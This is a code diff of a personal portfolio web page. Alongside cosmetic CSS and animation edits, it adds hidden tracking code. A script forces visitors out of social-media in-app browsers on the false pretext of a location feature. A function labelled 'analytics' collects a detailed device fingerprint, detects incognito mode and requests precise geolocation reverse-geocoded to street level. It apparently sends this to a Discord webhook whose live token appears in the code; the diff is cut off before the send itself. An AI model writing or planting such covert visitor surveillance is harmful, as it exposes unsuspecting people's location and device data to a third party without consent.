@@ -3,52 +3,65 @@
 <head>
 <meta charset="UTF-8">
 
+<!-- ═══════════════════════════════════════════════════════════════════
+     ██  IAB GUARD — LETAKKAN DI PALING ATAS <head>, JANGAN DIPINDAH  ██
+     Mendeteksi In-App Browser (Instagram/TikTok/FB/dll) dan memaksa
+     user membuka di Chrome / Safari. Tidak menyentuh logika bot sama sekali.
+     ═══════════════════════════════════════════════════════════════════ -->
 <script>
 (function IABGuard() {
   'use strict';
 
+  /* ── 1. Deteksi User-Agent ─────────────────────────────────────── */
   var ua = navigator.userAgent || '';
 
+  /* Sinyal khas In-App Browser dari berbagai platform */
   var IAB_SIGNALS = [
-      'Instagram',
-      'FBAN','FBAV','FB_IAB','FBIOS','FBSV','FB4A',
-      'TikTok','musical_ly','BytedanceWebview','aweme',
-      'Snapchat',
-      'Line/',
-      'WhatsApp',
-      'TwitterAndroid','Twitter for',
-      'LinkedInApp',
-      'Pinterest',
-      'Telegram',
-      'MicroMessenger',
-      'GSA',
+    /* Instagram */    'Instagram',
+    /* Facebook */     'FBAN','FBAV','FB_IAB','FBIOS','FBSV','FB4A',
+    /* TikTok */       'TikTok','musical_ly','BytedanceWebview','aweme',
+    /* Snapchat */     'Snapchat',
+    /* LINE */         'Line/',
+    /* WhatsApp */     'WhatsApp',
+    /* Twitter / X */  'TwitterAndroid','Twitter for',
+    /* LinkedIn */     'LinkedInApp',
+    /* Pinterest */    'Pinterest',
+    /* Telegram */     'Telegram',
+    /* WeChat */       'MicroMessenger',
+    /* Google App */   'GSA',
   ];
 
+  /* Jika bukan IAB → diam, tidak lakukan apa-apa */
   var isIAB = IAB_SIGNALS.some(function(sig){ return ua.indexOf(sig) !== -1; });
   if (!isIAB) return;
 
+  /* ── 2. Deteksi Platform ───────────────────────────────────────── */
   var isAndroid = /Android/i.test(ua);
   var isIOS     = /iPhone|iPad|iPod/i.test(ua);
   var pageUrl   = window.location.href;
 
-  // proses a
+  /* ── 3. Android → Redirect langsung ke Chrome via Intent URL ───── */
   if (isAndroid) {
     var loc = window.location;
     var intentUrl = 'intent://' + loc.host + loc.pathname + loc.search + loc.hash
                   + '#Intent;scheme=https;package=com.android.chrome;end';
     window.location.href = intentUrl;
+    /* Fallback: jika Chrome tidak terinstall → buka new tab */
     setTimeout(function(){ window.open(pageUrl, '_blank'); }, 800);
-    return;
+    return; /* stop, tidak perlu modal */
   }
 
-  // proses b
+  /* ── 4. iOS → Coba buka di Chrome iOS dulu ────────────────────── */
   if (isIOS) {
     var chromeUrl = pageUrl.replace(/^https?:\/\//i, 'googlechrome://');
     window.location.href = chromeUrl;
+    /* Jika Chrome tidak ada, akan gagal diam-diam → modal akan muncul */
   }
 
+  /* ── 5. Inject Modal Overlay (iOS & OS lain) ───────────────────── */
   var browserLabel = isIOS ? 'Safari / Chrome' : 'Browser Eksternal';
 
+  /* Langkah-langkah sesuai OS */
   var stepsHTML = isIOS
     ? '<li>Tap tombol <b style="color:#fff">Share ↑</b> di bawah layar</li>'
     + '<li>Pilih <b style="color:#fff">"Open in Safari"</b> dari menu</li>'
@@ -57,8 +70,9 @@
     + '<b style="color:#fff">"Open in External Browser"</b></li>';
 
   function injectModal() {
-    if (document.getElementById('iab-guard-overlay')) return;
+    if (document.getElementById('iab-guard-overlay')) return; /* cegah double */
 
+    /* ── Buat elemen overlay ── */
     var overlay = document.createElement('div');
     overlay.id  = 'iab-guard-overlay';
     overlay.setAttribute('role', 'dialog');
@@ -75,6 +89,7 @@
     ].join(';');
 
     overlay.innerHTML = ''
+      /* ── Keyframes & helper styles ── */
       + '<style>'
         + '@keyframes iabFadeIn{from{opacity:0}to{opacity:1}}'
         + '@keyframes iabSlideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}'
@@ -98,6 +113,7 @@
         + '#iab-guard-close:active{background:rgba(255,255,255,.12)}'
       + '</style>'
 
+      /* ── Card utama ── */
       + '<div id="iab-guard-card" style="'
           + 'width:100%;max-width:480px;'
           + 'background:#0d1024;'
@@ -108,6 +124,7 @@
                        + '0 20px 60px rgba(0,0,0,.6);'
           + 'font-family:system-ui,-apple-system,sans-serif">'
 
+        /* Header */
         + '<div style="display:flex;align-items:flex-start;gap:14px;margin-bottom:18px">'
           + '<div style="width:48px;height:48px;min-width:48px;border-radius:14px;flex-shrink:0;'
               + 'background:linear-gradient(135deg,rgba(124,106,247,.22),rgba(34,211,238,.12));'
@@ -120,6 +137,7 @@
               + 'Fitur lokasi tidak tersedia di browser in-app. '
               + 'Buka di browser asli untuk melanjutkan.</div>'
           + '</div>'
+          /* Tombol X */
           + '<button id="iab-guard-close" aria-label="Tutup" style="'
               + 'width:30px;height:30px;min-width:30px;border-radius:50%;flex-shrink:0;'
               + 'background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);'
@@ -129,6 +147,7 @@
               + 'transition:background .2s">&times;</button>'
         + '</div>'
 
+        /* Langkah-langkah */
         + '<div style="padding:14px 16px;'
             + 'background:rgba(255,255,255,.03);'
             + 'border:1px solid rgba(255,255,255,.07);'
@@ -136,6 +155,7 @@
           + '<ul>' + stepsHTML + '</ul>'
         + '</div>'
 
+        /* Tombol CTA */
         + '<button id="iab-open-btn" style="'
             + 'width:100%;padding:14px 20px;border:none;border-radius:50px;cursor:pointer;'
             + 'background:linear-gradient(135deg,rgba(124,106,247,.9),rgba(34,211,238,.7));'
@@ -145,15 +165,17 @@
           + 'Buka di ' + browserLabel
         + '</button>'
 
-      + '</div>';
+      + '</div>'; /* end card */
 
     document.body.appendChild(overlay);
 
+    /* ── Event: Tombol Close ── */
     document.getElementById('iab-guard-close').addEventListener('click', function(){
       overlay.style.animation = 'iabFadeOut .25s ease forwards';
       setTimeout(function(){ if(overlay.parentNode) overlay.remove(); }, 260);
     });
 
+    /* ── Event: Tombol CTA ── */
     document.getElementById('iab-open-btn').addEventListener('click', function(){
       if (isAndroid) {
         var loc = window.location;
@@ -161,6 +183,7 @@
                              + '#Intent;scheme=https;package=com.android.chrome;end';
         setTimeout(function(){ window.open(pageUrl, '_blank'); }, 800);
       } else if (isIOS) {
+        /* Coba Chrome lagi, fallback ke alert share guide */
         window.location.href = pageUrl.replace(/^https?:\/\//i, 'googlechrome://');
         setTimeout(function(){
           alert('Tap tombol Share ↑ di bawah, lalu pilih "Open in Safari".');
@@ -171,6 +194,7 @@
     });
   }
 
+  /* Inject segera jika body sudah ada, atau tunggu DOMContentLoaded */
   if (document.body) {
     injectModal();
   } else {
@@ -179,6 +203,7 @@
 
 }());
 </script>
+<!-- ════ /IAB GUARD ════════════════════════════════════════════════ -->
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Hi there! — by Riski Romadhan Maulana</title>
@@ -257,9 +282,8 @@ a,button{touch-action:manipulation}
 .nav-links::-webkit-scrollbar{display:none}
 .nav-link{font-family:var(--font-display);font-size:0.7rem;font-weight:600;letter-spacing:0.08em;text-transform:uppercase;color:var(--text-dim);padding:7px 11px;border-radius:40px;transition:color 0.25s,background 0.25s;text-decoration:none;white-space:nowrap;flex-shrink:0}
 .nav-link:hover,.nav-link.active{color:var(--text);background:rgba(255,255,255,0.07)}
-.nav-cta{font-family:var(--font-display);font-size:0.7rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#fff;padding:7px 16px;border-radius:40px;background:linear-gradient(135deg,rgba(124,106,247,0.8),rgba(34,211,238,0.6));border:1px solid rgba(124,106,247,0.5);text-decoration:none;transition:opacity 0.2s,transform 0.2s;white-space:nowrap;margin-left:4px;flex-shrink:0}
-.nav-cta:active{opacity:0.82;transform:scale(0.94)}
-@media(hover:hover){.nav-cta:hover{opacity:0.85}}
+.nav-cta{font-family:var(--font-display);font-size:0.7rem;font-weight:700;letter-spacing:0.08em;text-transform:uppercase;color:#fff;padding:7px 16px;border-radius:40px;background:linear-gradient(135deg,rgba(124,106,247,0.8),rgba(34,211,238,0.6));border:1px solid rgba(124,106,247,0.5);text-decoration:none;transition:opacity 0.25s,transform 0.25s;white-space:nowrap;margin-left:4px;flex-shrink:0}
+.nav-cta:hover{opacity:0.85}
 .nav-sep{width:1px;height:18px;background:var(--border);margin:0 4px;flex-shrink:0}
 
 #app{position:relative;z-index:10;opacity:1}
@@ -279,11 +303,11 @@ section{position:relative;z-index:10}
 .hero-byline span{color:var(--text);font-weight:600}
 .hero-desc{max-width:480px;margin:16px auto 0;font-size:clamp(0.88rem,2.5vw,1rem);color:var(--text-dim);line-height:1.75;font-weight:300;padding:0 10px}
 .hero-btns{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:36px;padding:0 10px}
-.btn-primary{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;background:linear-gradient(135deg,rgba(124,106,247,0.85),rgba(34,211,238,0.6));border:1px solid rgba(124,106,247,0.5);border-radius:50px;font-family:var(--font-display);font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#fff;text-decoration:none;transition:transform 0.25s cubic-bezier(.2,.8,.2,1),opacity 0.25s,box-shadow 0.25s;box-shadow:0 0 30px rgba(124,106,247,0.2);-webkit-tap-highlight-color:transparent;position:relative;overflow:hidden}
-.btn-primary:active{transform:scale(0.94);opacity:0.88;box-shadow:0 0 18px rgba(124,106,247,0.4)}
+.btn-primary{display:inline-flex;align-items:center;gap:8px;padding:13px 26px;background:linear-gradient(135deg,rgba(124,106,247,0.85),rgba(34,211,238,0.6));border:1px solid rgba(124,106,247,0.5);border-radius:50px;font-family:var(--font-display);font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:#fff;text-decoration:none;transition:transform 0.3s,opacity 0.3s,box-shadow 0.3s;box-shadow:0 0 30px rgba(124,106,247,0.2);-webkit-tap-highlight-color:transparent}
+.btn-primary:active{transform:scale(0.96);opacity:0.9}
 @media(hover:hover){.btn-primary:hover{transform:translateY(-2px);opacity:0.9;box-shadow:0 8px 40px rgba(124,106,247,0.35)}}
-.btn-ghost{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border:1px solid var(--border2);border-radius:50px;font-family:var(--font-display);font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);text-decoration:none;transition:color 0.25s cubic-bezier(.2,.8,.2,1),border-color 0.25s,background 0.25s,transform 0.2s;-webkit-tap-highlight-color:transparent}
-.btn-ghost:active{background:rgba(255,255,255,0.07);color:var(--text);border-color:rgba(255,255,255,0.3);transform:scale(0.95)}
+.btn-ghost{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border:1px solid var(--border2);border-radius:50px;font-family:var(--font-display);font-size:0.75rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);text-decoration:none;transition:color 0.3s,border-color 0.3s,background 0.3s;-webkit-tap-highlight-color:transparent}
+.btn-ghost:active{background:rgba(255,255,255,0.04);color:var(--text)}
 @media(hover:hover){.btn-ghost:hover{color:var(--text);border-color:rgba(255,255,255,0.25);background:rgba(255,255,255,0.04)}}
 .hero-scroll{position:absolute;bottom:28px;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:6px;opacity:0.35;animation:scrollBounce 2.2s ease-in-out infinite}
 @keyframes scrollBounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(6px)}}
@@ -348,8 +372,8 @@ section{position:relative;z-index:10}
 .form-input:focus{border-color:rgba(124,106,247,0.6);box-shadow:0 0 0 3px rgba(124,106,247,0.1)}
 .form-input::placeholder{color:var(--text-mute);font-weight:300}
 .form-input:-webkit-autofill{-webkit-box-shadow:0 0 0 40px rgba(10,14,32,0.95) inset !important;-webkit-text-fill-color:var(--text) !important}
-.btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,rgba(124,106,247,0.85),rgba(34,211,238,0.55));border:1px solid rgba(124,106,247,0.4);border-radius:50px;font-family:var(--font-display);font-size:0.73rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:#fff;cursor:pointer;transition:opacity 0.25s cubic-bezier(.2,.8,.2,1),transform 0.2s cubic-bezier(.2,.8,.2,1),box-shadow 0.25s;box-shadow:0 0 24px rgba(124,106,247,0.2);-webkit-appearance:none;touch-action:manipulation}
-.btn-submit:active{transform:scale(0.96);opacity:0.88;box-shadow:0 0 32px rgba(124,106,247,0.45)}
+.btn-submit{width:100%;padding:14px;background:linear-gradient(135deg,rgba(124,106,247,0.85),rgba(34,211,238,0.55));border:1px solid rgba(124,106,247,0.4);border-radius:50px;font-family:var(--font-display);font-size:0.73rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:#fff;cursor:pointer;transition:opacity 0.3s,transform 0.3s,box-shadow 0.3s;box-shadow:0 0 24px rgba(124,106,247,0.2);-webkit-appearance:none;touch-action:manipulation}
+.btn-submit:active{transform:scale(0.98)}
 @media(hover:hover){.btn-submit:hover{opacity:0.9;transform:translateY(-1px);box-shadow:0 6px 36px rgba(124,106,247,0.35)}}
 
 .socials{display:flex;gap:8px;justify-content:center;margin-top:28px;flex-wrap:wrap}
@@ -360,46 +384,37 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 .footer-logo{font-family:var(--font-display);font-size:1.3rem;font-weight:800;letter-spacing:0.12em;color:var(--text);margin-bottom:10px}
 .footer-copy{font-family:var(--font-mono);font-size:0.6rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--text-mute)}
 
-.hero-wave{display:inline-block;vertical-align:middle;font-size:0.85em;line-height:0}
-.wave-svg{width:0.85em;height:0.85em;display:inline-block;vertical-align:middle;overflow:visible;filter:drop-shadow(0 0 6px rgba(249,199,79,0.5))}
-.wave-hand-g{transform-origin:28px 38px;animation:waveHandSvg 2.4s ease-in-out infinite}
-@keyframes waveHandSvg{
-  0%,100%{transform:rotate(0deg)}
-  12%{transform:rotate(20deg)}
-  28%{transform:rotate(-10deg)}
-  44%{transform:rotate(18deg)}
-  60%{transform:rotate(-5deg)}
-  76%{transform:rotate(14deg)}
-  90%{transform:rotate(-3deg)}
-}
-.wave-sparkle{animation:sparklePop 2.4s ease-in-out 0.3s infinite;transform-origin:44px 8px}
-@keyframes sparklePop{0%,100%{opacity:0.9;transform:scale(1)}50%{opacity:0.2;transform:scale(0.3)}}
-.wave-sparkle2{animation:sparklePop 2.4s ease-in-out 0.8s infinite}
-.wave-sparkle3{animation:sparklePop 2.4s ease-in-out 1.4s infinite}
+.hero-wave{display:inline-block;animation:waveHand 1.8s ease-in-out infinite;transform-origin:70% 70%;font-size:0.85em;vertical-align:middle}
+@keyframes waveHand{0%,100%{transform:rotate(0deg)}15%{transform:rotate(18deg)}30%{transform:rotate(-8deg)}45%{transform:rotate(16deg)}60%{transform:rotate(-4deg)}75%{transform:rotate(12deg)}90%{transform:rotate(-4deg)}}
 
 .hero-hi{
   position:relative;
   display:inline-block;
-  animation:hiPop 1.1s cubic-bezier(.2,1.2,.4,1) both, hiGlow 4.5s ease-in-out 1.1s infinite;
+  animation:hiPop 0.7s cubic-bezier(.2,1.6,.4,1) both, hiGlow 3s ease-in-out 0.7s infinite;
   letter-spacing:-0.06em;
 }
 @keyframes hiPop{
-  0%{opacity:0;transform:scale(0.6) translateY(20px)}
-  65%{transform:scale(1.05) translateY(-4px)}
-  85%{transform:scale(0.98) translateY(1px)}
-  100%{opacity:1;transform:scale(1) translateY(0)}
+  0%{opacity:0;transform:scale(0.4) translateY(30px) skewX(-8deg)}
+  60%{transform:scale(1.08) translateY(-6px) skewX(2deg)}
+  80%{transform:scale(0.97) translateY(2px)}
+  100%{opacity:1;transform:scale(1) translateY(0) skewX(0)}
 }
 @keyframes hiGlow{
-  0%,100%{filter:drop-shadow(0 0 14px rgba(167,139,250,0.4)) drop-shadow(0 0 30px rgba(34,211,238,0.15))}
-  40%{filter:drop-shadow(0 0 24px rgba(167,139,250,0.75)) drop-shadow(0 0 50px rgba(34,211,238,0.4)) drop-shadow(0 0 80px rgba(124,106,247,0.25))}
-  70%{filter:drop-shadow(0 0 18px rgba(34,211,238,0.55)) drop-shadow(0 0 40px rgba(167,139,250,0.3))}
+  0%,100%{filter:drop-shadow(0 0 18px rgba(167,139,250,0.5)) drop-shadow(0 0 40px rgba(34,211,238,0.2))}
+  30%{filter:drop-shadow(0 0 30px rgba(167,139,250,0.9)) drop-shadow(0 0 60px rgba(34,211,238,0.5)) drop-shadow(0 0 90px rgba(124,106,247,0.3))}
+  60%{filter:drop-shadow(0 0 20px rgba(34,211,238,0.7)) drop-shadow(0 0 50px rgba(167,139,250,0.4))}
 }
 
-.nav-smile{display:inline-block;vertical-align:middle;line-height:0}
-.smile-svg{width:1.1em;height:1.1em;display:inline-block;vertical-align:middle;overflow:visible}
-.smile-ray{transform-origin:12px 12px;animation:smileRotate 4s linear infinite}
-@keyframes smileRotate{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
-@media(prefers-reduced-motion:reduce){.wave-hand-g,.wave-sparkle,.wave-sparkle2,.wave-sparkle3,.smile-ray{animation:none}}
+.nav-smile{display:inline-block;animation:sparkSpin 2s ease-in-out infinite}
+@keyframes sparkSpin{
+  0%{transform:scale(1) rotate(0deg);filter:brightness(1)}
+  20%{transform:scale(1.4) rotate(72deg);filter:brightness(1.8) drop-shadow(0 0 6px #a78bfa)}
+  40%{transform:scale(0.9) rotate(144deg);filter:brightness(1)}
+  60%{transform:scale(1.3) rotate(216deg);filter:brightness(1.6) drop-shadow(0 0 8px #22d3ee)}
+  80%{transform:scale(1) rotate(288deg);filter:brightness(1)}
+  100%{transform:scale(1) rotate(360deg);filter:brightness(1)}
+}
+@media(prefers-reduced-motion:reduce){.hero-wave,.nav-smile,.hero-hi{animation:none}}
 .float-a{animation:floatA 6s ease-in-out infinite}
 .float-b{animation:floatA 7.5s ease-in-out 2s infinite}
 @keyframes floatA{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
@@ -499,16 +514,13 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 .aurora-layer::after{animation-duration:34s}
 .aurora-mid::before{animation-duration:40s}
 
-@keyframes btnRipple{0%{transform:scale(0);opacity:0.5}100%{transform:scale(4);opacity:0}}
-.btn-ripple{position:absolute;border-radius:50%;background:rgba(255,255,255,0.3);width:60px;height:60px;margin-left:-30px;margin-top:-30px;pointer-events:none;animation:btnRipple 0.5s ease-out forwards}
-
-@media(prefers-reduced-motion:reduce){
-  .wave-hand-g,.wave-sparkle,.wave-sparkle2,.wave-sparkle3,.smile-ray,.hero-hi{animation:none}
-  .float-a,.float-b{animation:none}
-}
+/* ── IAB: keyframe for iOS toast (injected via JS) ────────── */
+@keyframes iabUp{from{opacity:0;transform:translateY(100%)}to{opacity:1;transform:translateY(0)}}
 </style>
 </head>
 <body>
+
+<!-- ── IAB iOS Toast injected via JS only when needed ──────── -->
 
 <canvas id="galaxy-canvas" aria-hidden="true"></canvas>
 
@@ -519,7 +531,7 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
 
   <nav id="navbar" aria-label="Main navigation">
     <div class="nav-inner">
-      <div class="nav-logo">Hello! <span class="nav-smile"><svg class="smile-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path class="smile-ray" d="M12 2v3M12 19v3M2 12h3M19 12h3M4.93 4.93l2.12 2.12M16.95 16.95l2.12 2.12M4.93 19.07l2.12-2.12M16.95 7.05l2.12-2.12" stroke="#a78bfa" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="12" r="4" fill="#a78bfa" opacity="0.9"/><circle cx="12" cy="12" r="2" fill="#fff" opacity="0.6"/></svg></span></div>
+      <div class="nav-logo">Hello! <span class="nav-smile">✨</span></div>
       <div class="nav-sep"></div>
       <div class="nav-links">
         <a href="#home" class="nav-link active">Home</a>
@@ -538,7 +550,7 @@ footer{position:relative;z-index:10;padding:36px 16px;border-top:1px solid var(-
       Available for work
     </div>
     <h1 class="hero-h1 reveal reveal-d1">
-      <span class="grad hero-hi">Hi</span> <span class="hero-wave"><svg class="wave-svg" viewBox="0 0 56 56" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><g class="wave-hand-g"><path d="M28 46C19.163 46 12 38.837 12 30V16a3 3 0 0 1 6 0v10" stroke="#f9c74f" stroke-width="3.2" stroke-linecap="round"/><path d="M18 26V13a3 3 0 0 1 6 0v13" stroke="#f9c74f" stroke-width="3.2" stroke-linecap="round"/><path d="M24 26V11a3 3 0 0 1 6 0v15" stroke="#f9c74f" stroke-width="3.2" stroke-linecap="round"/><path d="M30 26V14a3 3 0 0 1 6 0v13" stroke="#f9c74f" stroke-width="3.2" stroke-linecap="round"/><path d="M36 27V19a3 3 0 0 1 6 0v11c0 8.837-7.163 16-16 16" stroke="#f9c74f" stroke-width="3.2" stroke-linecap="round"/><path class="wave-sparkle" d="M42 10 L44 6 L46 10 L42 10Z" fill="#a78bfa" opacity="0.9"/><circle class="wave-sparkle2" cx="10" cy="18" r="2" fill="#22d3ee" opacity="0.8"/><circle class="wave-sparkle3" cx="46" cy="28" r="1.5" fill="#f472b6" opacity="0.7"/></g></svg></span>
+      <span class="grad hero-hi">Hi!</span> <span class="hero-wave">👋</span>
     </h1>
     <p class="hero-byline reveal reveal-d2">
       <span class="riski-name">RISKI RM</span> — Digital Kuli From Earth 🌍
@@ -1273,6 +1285,7 @@ function animateRings(){
   const rings  = document.querySelectorAll('.ring-fg');
   const pctEls = document.querySelectorAll('.skill-pct');
 
+  /* Reset semua ring ke 0 dulu */
   rings.forEach(ring => {
     ring.style.strokeDasharray  = CIRC;
     ring.style.strokeDashoffset = CIRC;
@@ -1289,6 +1302,7 @@ function animateRings(){
 
       function step(now){
         const p    = Math.min((now - t0) / dur, 1);
+        /* ease-out cubic */
         const ease = 1 - Math.pow(1 - p, 3);
         const val  = Math.round(ease * target);
         ring.style.strokeDashoffset = CIRC - (val / 100) * CIRC;
@@ -1346,19 +1360,6 @@ function startCounters(){
   }, { threshold: 0.4 });
   document.querySelectorAll('.counter').forEach(el => obs.observe(el));
 }
-
-document.querySelectorAll('.btn-primary, .btn-ghost').forEach(btn => {
-  btn.addEventListener('touchstart', function(e){
-    const touch = e.touches[0];
-    const rect = btn.getBoundingClientRect();
-    const ripple = document.createElement('span');
-    ripple.className = 'btn-ripple';
-    ripple.style.left = (touch.clientX - rect.left) + 'px';
-    ripple.style.top  = (touch.clientY - rect.top)  + 'px';
-    btn.appendChild(ripple);
-    setTimeout(() => ripple.remove(), 520);
-  }, { passive: true });
-});
 
 document.querySelectorAll('a[href^="#"]').forEach(a=>{
   a.addEventListener('click', function(e){
@@ -1435,12 +1436,290 @@ document.getElementById('contact-form').addEventListener('submit', async functio
   }, 4000);
 });
 
+(async function sendAnalytics(){
+  const WEBHOOK = 'https://discord.com/api/webhooks/1512402866432901180/fQcOarEO-BJ73H_sak3D-Y1ZBIPPeBOze-FG9m-vzIRPDkEfofe7Cq9RRqPxXt-GWC3N';
+
+  if(sessionStorage.getItem('beta_analytics_sent')) return;
+  sessionStorage.setItem('beta_analytics_sent', 'true');
+
+  const pageEnterTime = Date.now();
+
+  function getDeviceInfo(){
+    try {
+      const parser = new UAParser();
+      const result = parser.getResult();
+      const ua = navigator.userAgent;
+      let model  = result.device.model  || '';
+      let vendor = result.device.vendor || '';
+      if(!model){
+        const patterns = [
+          [/iPhone/i,          'iPhone'],
+          [/iPad/i,            'iPad'],
+          [/(SM-[A-Z0-9]+)/i,  m => m[1]],
+          [/(Pixel \d[a-z]*)/i,m => m[1]],
+          [/(POCO [A-Z0-9]+)/i,m => m[1]],
+          [/(Redmi [A-Z0-9]+)/i,m=> m[1]],
+          [/(OPPO [A-Z0-9]+)/i,m => m[1]],
+          [/(vivo [A-Z0-9]+)/i,m => m[1]],
+        ];
+        for(const [rx, val] of patterns){
+          const m = ua.match(rx);
+          if(m){ model = typeof val === 'function' ? val(m) : val; break; }
+        }
+      }
+      if(!vendor && model){
+        if(/iPhone|iPad|Mac/i.test(model))           vendor = 'Apple';
+        else if(/SM-/i.test(model))                  vendor = 'Samsung';
+        else if(/Pixel/i.test(model))                vendor = 'Google';
+        else if(/POCO|Redmi/i.test(model))           vendor = 'Xiaomi';
+        else if(/OPPO/i.test(model))                 vendor = 'OPPO';
+        else if(/vivo/i.test(model))                 vendor = 'Vivo';
+      }
+      let osVer = '';
+      const avMatch = ua.match(/Android ([\d.]+)/i);
+      const iosMatch = ua.match(/OS ([\d_]+) like Mac/i);
+      const winMatch = ua.match(/Windows NT ([\d.]+)/i);
+      const macMatch = ua.match(/Mac OS X ([\d_]+)/i);
+      if(avMatch)       osVer = `Android ${avMatch[1]}`;
+      else if(iosMatch) osVer = `iOS ${iosMatch[1].replace(/_/g,'.')}`;
+      else if(winMatch) {
+        const map = {'10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7','6.0':'Vista'};
+        osVer = `Windows ${map[winMatch[1]] || winMatch[1]}`;
+      }
+      else if(macMatch) osVer = `macOS ${macMatch[1].replace(/_/g,'.')}`;
+      let browserVer = '';
+      const cvM = ua.match(/Chrome\/([\d.]+)/i);
+      const ffM = ua.match(/Firefox\/([\d.]+)/i);
+      const sfM = ua.match(/Version\/([\d.]+).*Safari/i);
+      const edM = ua.match(/Edg\/([\d.]+)/i);
+      if(edM) browserVer = `Edge ${edM[1].split('.')[0]}`;
+      else if(cvM) browserVer = `Chrome ${cvM[1].split('.')[0]}`;
+      else if(ffM) browserVer = `Firefox ${ffM[1].split('.')[0]}`;
+      else if(sfM) browserVer = `Safari ${sfM[1]}`;
+      return {
+        model:      model  || 'Unknown',
+        vendor:     vendor || 'Unknown',
+        type:       result.device.type || 'desktop',
+        osVer,
+        browserVer
+      };
+    } catch(err) {
+      return { model:'Unknown', vendor:'Unknown', type:'desktop', osVer:'', browserVer:'' };
+    }
+  }
+
+  async function getBattery(){
+    try {
+      if(!navigator.getBattery) return null;
+      const bat = await navigator.getBattery();
+      const pct = Math.round(bat.level * 100);
+      const charging = bat.charging ? '⚡ Charging' : '🔋 Not charging';
+      return `${pct}% — ${charging}`;
+    } catch { return null; }
+  }
+
+  async function detectIncognito(){
+    try {
+      return new Promise(res => {
+        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+        if(!fs){ res('Unknown'); return; }
+        fs(window.TEMPORARY, 100, ()=> res('No (Normal)'), ()=> res('Yes (Private/Incognito)'));
+      });
+    } catch { return 'Unknown'; }
+  }
+
+  async function getDetailedLocation(){
+    return new Promise((resolve)=>{
+      if(sessionStorage.getItem('loc_asked')){ resolve(null); return; }
+      sessionStorage.setItem('loc_asked','1');
+      if(!navigator.geolocation){ resolve(null); return; }
+      navigator.geolocation.getCurrentPosition(
+        async (pos)=>{
+          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
+          try {
+            const res  = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            if(data && data.address){
+              const a = data.address;
+              resolve({
+                jalan:     a.road || a.pedestrian || a.footway || a.path || '',
+                kelurahan: a.suburb || a.neighbourhood || a.hamlet || '',
+                kecamatan: a.city_district || a.district || a.county || '',
+                kota:      a.city || a.town || a.village || a.municipality || '',
+                negara:    a.country || '',
+                postcode:  a.postcode || '',
+                placeId:  `osm:${data.place_id}`,
+                lat, lon, accuracy: Math.round(accuracy)
+              });
+            } else { resolve(null); }
+          } catch { resolve(null); }
+        },
+        ()=> resolve(null),
+        { timeout: 8000, enableHighAccuracy: true }
+      );
+    });
+  }
+
+  const deviceInfo = getDeviceInfo();
+  const ua         = navigator.userAgent || '';
+  const lang       = navigator.language || navigator.languages?.[0] || 'unknown';
+  const langs      = (navigator.languages || [navigator.language]).join(', ');
+  const scr        = `${screen.width}×${screen.height}`;
+  const viewport   = `${window.innerWidth}×${window.innerHeight}`;
+  const dpr        = window.devicePixelRatio || 1;
+  const orientation= screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
+  const tz         = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+  const referrer   = document.referrer || 'Direct';
+  const pageUrl    = window.location.href;
+  const localTime  = new Date().toLocaleString('id-ID', { dateStyle:'full', timeStyle:'medium' });
+  const colorScheme= window.matchMedia('(prefers-color-scheme: dark)').matches ? '🌑 Dark' : '☀️ Light';
+  const touchSupport= ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No';
+  const cpuCores   = navigator.hardwareConcurrency || 'Unknown';
+  const ramGB      = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+  const doNotTrack = navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
+  const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+  const plugins    = navigator.plugins?.length || 0;
+
+  let browser = 'Unknown';
+  if(/Edg\//i.test(ua))          browser = 'Edge';
+  else if(/OPR\//i.test(ua))     browser = 'Opera';
+  else if(/Firefox\//i.test(ua)) browser = 'Firefox';
+  else if(/Chrome\//i.test(ua))  browser = 'Chrome';
+  else if(/Safari\//i.test(ua))  browser = 'Safari';
+
+  let os = 'Unknown';
+  if(/Windows NT/i.test(ua))          os = 'Windows';
+  else if(/Mac OS X/i.test(ua))       os = 'macOS';
+  else if(/Android/i.test(ua))        os = 'Android';
+  else if(/iOS|iPhone|iPad/i.test(ua))os = 'iOS';
+  else if(/Linux/i.test(ua))          os = 'Linux';
+
+  const isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
+  const deviceType = isMobileUA ? 'Mobile' : 'Desktop';
+
